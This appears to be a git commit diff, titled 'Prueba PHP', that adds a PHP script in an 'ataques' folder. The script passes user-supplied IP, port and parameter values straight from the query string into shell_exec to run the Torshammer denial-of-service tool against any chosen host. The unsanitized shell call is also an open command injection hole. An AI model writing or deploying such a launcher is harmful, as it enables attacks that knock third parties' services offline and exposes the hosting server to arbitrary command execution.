4cf459b27455c82d3aa6346c755a3170cd2847a4
Alex Kevin Muñoz Gil <amunozgil@elpuig.xeill.net>
2022-04-29 11:57:59 +0200

    Prueba PHP

--- ataques/Scripts.php
+++ ataques/Scripts.php
@@ -1,7 +1,7 @@
 <?php
 
+// Use ls command to shell_exec
+// function
+$output = shell_exec('python3 ./scripts/ThorHammer/Torshammer 1.0/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);
 
-
-
-
- ?>
+?>
